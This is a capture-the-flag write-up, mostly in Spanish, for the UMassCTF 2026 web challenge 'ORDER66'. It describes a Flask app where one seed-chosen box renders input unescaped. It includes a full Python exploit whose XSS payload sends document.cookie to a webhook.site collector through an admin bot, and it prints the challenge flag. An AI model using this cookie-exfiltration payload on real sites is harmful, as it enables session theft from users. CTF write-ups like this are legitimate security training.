# ORDER66 — UMassCTF 2026 (WEB)

| Campo       | Valor                          |
|-------------|--------------------------------|
| Plataforma  | UMassCTF 2026                  |
| Categoría   | Web Exploitation               |
| Dificultad  | Easy                           |
| Puntos      | 100                            |
| Solves      | 130                            |

## Descripción
> See if you can figure out what order to execute...

## TL;DR
66-box grid where one box (determined by PRNG seed) renders with `| safe` (no Jinja2 escaping). Compute vuln_index from seed, inject XSS in that box, send view URL to admin bot which carries FLAG cookie.

## Análisis

### Architecture
- Flask app with Redis storage, 66 input boxes in a grid
- One box per session is the "vulnerable" one: `{{ content | safe }}` (XSS sink)
- Puppeteer bot sets `flag` cookie (non-httpOnly) and visits submitted URLs
- Bot runs as subprocess inside web container (has internet access)

### Key Observations

1. **Vuln index is deterministic from seed**: `random.seed(seed); v_index = random.randint(1, 66)`
2. **Seed is exposed** in page source: `const bot_seed = "{{ seed }}"`
3. **Seed stays fixed** if XSS payload detected in vuln box (otherwise re-randomized)
4. **Only 1 box per submission** — must be the correct one
5. **`/view/<uid>/<seed>`** — public view URL, no auth needed

## Exploit

```python
import requests, random, re

BASE = 'http://order66.web.ctf.umasscybersec.org:32768'
EXFIL = 'https://webhook.site/YOUR-TOKEN'
s = requests.Session()

# 1. Get session
r = s.get(f'{BASE}/')
seed = int(re.search(r'const bot_seed = "(\d+)"', r.text).group(1))
uid = re.search(r'const bot_uid = "([^"]+)"', r.text).group(1)

# 2. Compute vuln index
random.seed(seed)
vuln_index = random.randint(1, 66)

# 3. XSS in vuln box only
payload = f'<script>new Image().src="{EXFIL}?c="+encodeURIComponent(document.cookie)</script>'
form = {f'box_{i}': (payload if i == vuln_index else '') for i in range(1, 67)}
s.post(f'{BASE}/', data=form)

# 4. Send view URL to bot
view_url = f'http://order66.web.ctf.umasscybersec.org:32768/view/{uid}/{seed}'
requests.post(f'{BASE}/admin/visit', data={'target_url': view_url})
```

## Flag
```
UMASS{m@7_t53_f0rce_b$_w!th_y8u}
```

## Key Lessons
- Jinja2 `| safe` filter is the classic XSS sink — one box out of 66 uses it
- PRNG seed exposed client-side makes vuln_index trivially computable
- Cookie exfiltration via `new Image().src` — httpOnly: false
